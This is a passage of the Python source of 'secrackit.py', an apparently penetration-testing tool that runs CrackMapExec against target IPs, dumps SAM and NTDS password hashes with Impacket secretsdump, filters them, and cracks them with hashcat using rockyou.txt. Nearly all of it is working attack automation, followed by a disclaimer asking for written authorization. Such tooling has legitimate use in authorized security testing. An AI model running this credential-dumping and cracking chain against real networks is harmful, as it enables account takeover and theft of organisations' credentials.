	hashcat_results_cmd = subprocess.run(["hashcat", "-m", "1000", "--username", file_for_hashcat_location, "/usr/share/wordlists/rockyou.txt", "--potfile-path", potfile_location, "--show"], capture_output=True)

	# To convert the byte output to string.
	hashcat_results_cmd_to_str = hashcat_results_cmd.stdout.decode()

	print(
		'Cracked hashes exported to potfile:\n'
		f'{potfile_location}\n'
	)

	return(hashcat_results_cmd_to_str)


# Export to file and show on terminal the results of --show from hashcat.
def export_file_and_terminal_results(final_cracked_list_results: str, final_hashcat_results_location: str, directory_location: Path):
	# Open new file with write permission with naming convention.
	with open(final_hashcat_results_location, "a") as export_final_data:
		# Write "removed_ansi_CME_output" to opened file.
		export_final_data.write(final_cracked_list_results)

	print(
		"Final hashcat results exported:\n"
		f"{final_cracked_list_results}\n"
		f"All findings exported to directory: {directory_location}"
	)



DEFAULT_OUTPUT_DIRECTORY = './'
DEFAULT_WORDLIST_PATH = '/usr/share/wordlists/rockyou.txt'

@app.command()
def main(
	domain_controller_ip: str,
	domain_name: str, 
	target_ips: Annotated[typer.FileText, typer.Argument(exists=True, dir_okay=False)], 
	active_directory_account: str, 
	flag_password_or_ntlm: Annotated[PasswordOrHashChoice, typer.Argument()],
	password_or_ntlm_hash: str, 
	local_auth: bool = False, 
	output_directory: Annotated[Path, typer.Option(file_okay = False)] = Path(DEFAULT_OUTPUT_DIRECTORY), 
	wordlist_path: Annotated[Path, typer.Option(exists=True, dir_okay=False)] = Path(DEFAULT_OUTPUT_DIRECTORY), 
	rule_path: Annotated[Optional[typer.FileText], typer.Option(exists=True, dir_okay=False)] = None,
):
	# domain_controller_ip - since the script defaults to AD auths, the domain_controller_ip is required.
	# domain_name - since the script defaults to AD auths, domain.name aka domain is required.
	# target_ips - targets CME(CrackMapExec) and Impacket-secretsdump(secretsdump) will attack.
	# active_directory_account - AD account both CME and secretsdump will use for their attacks.
	# flag_password_or_ntlm - {pw, ntlm} - "pw" or "ntlm" argument is required as it helps determine which is provided.
	# password_or_ntlm_hash - value of password or NTLM hash required by CME and secretsdump.
	# --use_local_auth - tells CME and secretsdump to auth against the IPs(hosts) and NOT the DC.
	# --output_directory - By default, files created by secrackit.py will be exported to the directory which secrackit.py is launched from. This option allows you to specify a different root directory.
	# --wordlist - Specify a custom wordlist for hashcat. /usr/share/wordlists/rockyou.txt runs by default when absent.
	# --rule-path - Specify location of custom rule for hashcat. No rule used when absent.
	#### Validate user IP input return to variable.
	validate_target_ips(target_ips)
	
	#### Argparse flags 'pw' and 'ntlm' are required options for input.
	#### This converts them over to needed value for operating CrackMapExec.
	converted_pw_hash_flag = '-p' if flag_password_or_ntlm == 'pw' else '-H'

	#### Parse NTLM or password input to determine which it is and provide feedback if needed.
	validated_NTLM_hash_or_password = was_valid_hash_or_password_provided(password_or_ntlm_hash, converted_pw_hash_flag)

	#### Create directory in current directory named (date/time)-secrackit.
	#### Return the full path to the newly created directory.
	directory_location = create_dir_for_dropping_that_output(output_directory)


	#### Run CME against domain. If results authenticate or not, show response.
	#### If successful, return results in decoded string format, to parse.
	if local_auth:

		run_crackmapexec_function_output = run_crackmapexec_against_local(target_ips, active_directory_account, converted_pw_hash_flag, validated_NTLM_hash_or_password, local_auth)

	else:

		run_crackmapexec_function_output = run_crackmapexec_against_domain(target_ips, domain_name, active_directory_account, converted_pw_hash_flag, validated_NTLM_hash_or_password, local_auth)


	#### Remove ANSI characters from the CME output.
	removed_ansi_CME_output = remove_ansi_escape(run_crackmapexec_function_output)



	#### Parse raw string from "run_crackmapexec" results.
	parsed_CME_string = parse_crackmapexec_results_string(removed_ansi_CME_output)



	#### Convert parsed data to list then sort. Also display results to terminal.
	CME_string_to_list = convert_parsed_CME_to_list(parsed_CME_string)



	#### Create IP list from parsed CME list.
	IP_list_for_secretsdump =  create_IP_list(CME_string_to_list)



	#### Create NetworkID for files.
	NetworkID_for_files = make_networkID(IP_list_for_secretsdump)



	#### Create directory in current directory named (date/time)-secrackit.
	os.makedirs(directory_location)



	#### Create file location for CME data export.
	cmd_data_file_location = cme_data_file(directory_location, NetworkID_for_files)



	#### Export CME results to file in newly created "directory_location" variable.
	export_CME_to_file(removed_ansi_CME_output, cmd_data_file_location)



	# Create empty list, either local or domain function below, to dump data into.
	secretsdump_raw_list: list[str] = []



	# Local authentication with secretsdump. Run through for loop and append results.
	print("\n\n\nStarting secretsdump attacks...")

	if local_auth == True:

		for IP in range(0, len(IP_list_for_secretsdump)):
			domain_name = IP_list_for_secretsdump[IP]
			var_secretsdump_raw = run_impacket_secretsdump(domain_name, active_directory_account, validated_NTLM_hash_or_password, IP_list_for_secretsdump[IP])
			secretsdump_raw_list.append(var_secretsdump_raw)


	# Domain authentication with secretsdump. Run through for loop and append results.
	else:

		for IP in range(0, len(IP_list_for_secretsdump)):
			var_secretsdump_raw = run_impacket_secretsdump(domain_name, active_directory_account, validated_NTLM_hash_or_password, IP_list_for_secretsdump[IP])
			secretsdump_raw_list.append(var_secretsdump_raw)



	#### Create file location for secretsdump raw export.
	secretsdump_raw_file_location = f"{directory_location}secretsdump_data_{NetworkID_for_files}.txt"



	#### Export raw secretsdump results to file in newly created "directory_location" variable.
	export_secretsdump_raw_list(secretsdump_raw_list, secretsdump_raw_file_location)



	#### Extract SAM section from "secretsdump_raw_list" and labels each hash found.
	SAM_section_parsed: list[str | None] = []
	for item in secretsdump_raw_list:
		SAM_section = remove_SAM_section(item)
		SAM_section_parsed.append(SAM_section)



	#### Extract NTDS section from "secretsdump_raw_list" and labels each hash found.
	NTDS_section_parsed: list[str | None] = []
	for item in secretsdump_raw_list:
		NTDS_section = remove_NTDS_section(item)
		NTDS_section_parsed.append(NTDS_section)



	#### Combine SAM matrix with NTDS matrix, row-wise, so results are per IP(in order).
	combined_SAM_NTDS_results = combine_convert_SAM_and_NTDS_results(SAM_section_parsed, NTDS_section_parsed)



	#### Parse secretsdump results.
	#### Each secretsdump result is an item in list called secretsdump_raw_list.
	#### Runs for loop for each in list through a function called "parsed_secretsdump_list".
	#### Returning a list containing hashcat friendly formatted hashes.
	#### Each returned list is appended to new list called ordered_per_IP_hash_list.
	ordered_per_IP_hash_list: list[list[str]] = []
	for asset in combined_SAM_NTDS_results:
		seperate_parsed_lists = parsed_secretsdump_list(asset)
		ordered_per_IP_hash_list.append(seperate_parsed_lists)



	#### Remove unwanted hashes. E.g. Default accounts aka aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 , WDAG, etc
	removed_default_hashes = remove_default_hashes(ordered_per_IP_hash_list)



	#### Remove computer hashes aka accounts with $- appended to account name.
	removed_computer_hashes = remove_computer_hashes(removed_default_hashes)



	#### Remove duplicate account:RID:NTLM... sometimes you'll see dup admin accounts.
	removed_duplicate_hashes = remove_duplicate_hashes(removed_computer_hashes)



	#### IP list from each secretsdump list for dictionary list below.
	Found_IPs_parsed: list[str] = []
	for IP in secretsdump_raw_list:
		IP_from_secrets = parse_IP_from_secrets(IP)
		Found_IPs_parsed.append(IP_from_secrets)



	#### Creating dictionary to hold IP as keys and next the username:hashes of each IP.
	secrets_dump_dictionary = {key: None for key in Found_IPs_parsed}



	#### Creating dictionary holding the IPs attacked(keys) and their related and hashcat friendly formatted hash lists(values).
	zip_dict_and_list = zip(secrets_dump_dictionary, removed_duplicate_hashes)
	final_IP_to_hash = {key:value for key,value in zip_dict_and_list}



	#### Convert dictionary to list of tuples.
	dictionary_of_lists_to_list_of_tuples = dict_key_value_to_IP_HASH(final_IP_to_hash)



	#### Create file for hash export.
	export_hashes_location = f"{directory_location}exported_hashes_{NetworkID_for_files}.txt"



	#### Convert list of tuples to list of strings.
	list_of_hashes_as_strings = tuples_to_list(dictionary_of_lists_to_list_of_tuples)



	#### Write list of strings to file for hashcat to ingest.
	file_for_hashcat_location = list_of_hashes_to_file(list_of_hashes_as_strings, export_hashes_location)



	#### Create potfile location.
	potfile_location = f"{directory_location}hashcat.potfile_{NetworkID_for_files}"



	#### Run hashcat with or without custom rule presented...
	#### If "-rule" argument is equal to None, then run hashcat with no rule passed.
	if not rule_path:
		# Running hashcat WITHOUT a custom rule present.
		# Passing "rule_location" for terminal feedback.
		# TODO type hashcat_results
		hashcat_results = run_hashcat(potfile_location, file_for_hashcat_location, wordlist_path, rule_path)

	else:
		# Running hashcat WITH validated custom rule present.
		# Passing "rule_location" f
		# TODO type hashcat_resultsor both hashcat and terminal feedback.
		hashcat_results = run_hashcat_rule(potfile_location, file_for_hashcat_location, wordlist_path, rule_path)



	#### Create raw hashcat output file location.
	hashcat_raw_file_location = f"{output_directory}hashcat_data_{NetworkID_for_files}.txt"



	#### Export hashcat raw output to file.
	hashcat_output_location = print_hashcat_raw(hashcat_results, hashcat_raw_file_location)



	#### Parses hashcat output for % of successful cracks.
	percentage_of_cracked = check_crack_percentage(hashcat_results)



	#### Gather final hashcat results by assigning decoded output of --show to var.
	final_cracked_list_results = final_cracked_list(potfile_location, file_for_hashcat_location)


	#### Create file for final hashcat results.
	final_hashcat_results_location = f'{directory_location}hashcat_FINAL_results_{NetworkID_for_files}.txt'


	#### Print off results to terminal and export to file.
	exported_file_and_terminal_results = export_file_and_terminal_results(final_cracked_list_results, final_hashcat_results_location, output_directory)


	##### Call functions - ENDING #####
	###################################



# Run the script and allow importing.
if __name__ == "__main__":
	app()








################## DISCLAIMER(s) ##################

#### secrackit.py disclaimer below -- as of 1-23-24

# 1. I take zero(0) responsibility for your actions if and when you ever use(execute) "secrackit.py".

# 2. Do NOT execute "secrackit.py" without prior WRITTEN authorization of the owners of ANY target(s), system(s), and/or network(s) secrackit.py may run against.

# 3. Do NOT use "secrackit.py" for illegal activities and/or purposes.

#### secrackit.py disclaimer above -- as of 1-23-24
########################################





